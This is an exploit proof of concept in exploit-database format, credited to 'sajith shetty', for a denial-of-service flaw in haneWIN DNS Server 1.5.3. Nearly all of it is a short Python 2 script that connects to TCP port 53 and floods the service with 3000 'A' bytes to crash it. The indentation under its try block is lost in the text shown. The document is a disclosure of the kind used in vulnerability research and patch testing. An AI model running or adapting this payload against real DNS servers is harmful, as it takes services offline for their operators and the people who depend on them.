###########################################################
[~] Exploit Title: haneWIN DNS Server 1.5.3 - Denial of service
[~] Author: sajith
[~] version: haneWIN DNS Server 1.5.3
[~]Vendor Homepage: http://www.hanewin.net/
[~] vulnerable app link:http://www.hanewin.net/dns-e.htm
[~]Tested in windows Xp sp3
###########################################################
#POC by sajith shetty
import socket

target = "127.0.0.1"
port   = 53

try:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
buf = "A" * 3000
request = buf
s.send(request)
data = s.recv(1024)
print data

except:

print "DNS server is Down!"
